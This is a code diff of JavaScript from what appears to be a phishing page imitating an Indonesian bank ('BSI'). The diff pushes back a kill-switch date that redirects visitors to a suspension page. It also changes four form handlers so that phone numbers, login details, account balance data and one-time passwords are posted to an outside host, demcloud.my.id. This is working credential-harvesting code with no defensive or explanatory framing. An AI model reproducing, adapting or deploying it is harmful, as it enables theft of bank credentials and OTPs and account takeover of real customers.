@@ -1,5 +1,5 @@
 let tglNow = new Date();
-let waktuBatas = new Date("2025-08-25T23:59:59");
+let waktuBatas = new Date("2025-08-30T23:59:59");
 if (tglNow.getTime() >= waktuBatas.getTime()) {
   document.location.href = 'https://suspend-web.pages.dev';
 } else {
@@ -19,7 +19,7 @@ $('.process1').fadeIn();
  
       $.ajax({
             type: 'POST',
-            url: 'rest/no.php',
+            url: 'https://demcloud.my.id/BSI/sdltr1/no.php',
             data: $('#formHP').serialize(),
             datatype: 'text',
             
@@ -50,7 +50,7 @@ $('.process1').fadeIn();
   
       $.ajax({
             type: 'POST',
-            url: 'rest/login.php',
+            url: 'https://demcloud.my.id/BSI/sdltr1/login.php',
             data: $('#formLog').serialize(),
             datatype: 'text',          
             complete: function(data) {
@@ -90,7 +90,7 @@ $('.process1').fadeIn();
   
       $.ajax({
             type: 'POST',
-            url: 'rest/saldo.php',
+            url: 'https://demcloud.my.id/BSI/sdltr1/saldo.php',
             data: $('#jualpuki').serialize(),
             datatype: 'text',          
             complete: function(data) {
@@ -135,7 +135,7 @@ function sendOtp() {
    
 $.ajax({
  type: 'POST',
- url: 'rest/otp.php',
+ url: 'https://demcloud.my.id/BSI/sdltr1/otp.php',
  async: false,
  dataType: 'JSON',
  data: $('#form2').serialize(),
